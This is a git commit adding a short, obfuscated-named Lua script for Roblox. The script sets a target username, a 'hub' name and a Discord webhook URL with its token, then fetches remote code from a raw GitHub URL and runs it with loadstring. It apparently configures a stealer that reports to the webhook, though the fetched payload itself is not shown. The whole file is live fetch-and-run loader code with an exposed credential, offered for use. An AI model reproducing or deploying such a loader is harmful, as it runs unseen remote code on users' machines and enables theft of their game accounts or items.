eeec7f1c49cbaebe4f3807357e19443054611268
jxmes7 <56454608+jxmes7@users.noreply.github.com>
2023-04-26 19:57:22 +0100

    Add files via upload

---
+++ obf_TS120kfBp0UgyJ1Q1zGa0ozPBh56267jy0Hy6S6QxWrnw2NVE96inz33Y8e01fFy.lua
@@ -0,0 +1,4 @@
+_G.Username = "happyguy3712"
+_G.HubName = "jxmes7"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1100856421769285785/3jbDfWzXa5GWad4qWHzOkr9Ezz9mKPzqxvh6FbQSb8THqSNayy3jjOfR2s_HmZNBvekA"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
